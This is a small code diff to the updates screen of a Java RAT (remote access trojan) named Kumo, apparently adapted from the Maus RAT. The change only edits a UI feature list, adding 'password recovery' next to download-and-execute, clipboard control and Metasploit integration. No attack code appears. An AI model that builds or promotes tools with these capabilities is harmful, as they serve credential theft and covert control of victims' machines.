@@ -41,7 +41,7 @@ class UpdatesView {
                 "easy to use UI. \n\nKumo is adapted from an open-sourced RAT called \nMaus (https://github.com/Ghosts/Maus). " +
                 "Kumo builds on \nthe foundation it laid out and improves on all of them.\n " +
                 "\nImprovements include:\n\t- Encrypted communication\n\t- Metasploit integration\n\t- UI improvements\n\t- Additional client JAR customization" +
-                "\n\t- Clipboard control\n\t- Download and execute\n\t- Under the hood networking improvements\n\t- Lots of bug fixes"), "");
+                "\n\t- Clipboard control\n\t- Download and execute\n\t- Password recovery\n\t- Misc client functions\n\t- Under the hood networking improvements\n\t- Lots of bug fixes"), "");
         Button checkUpdates = new Button("Check for Updates");
         checkUpdates.setOnMouseClicked(event -> {
             Platform.runLater(() -> NotificationView.openNotification("Update Check Complete"));
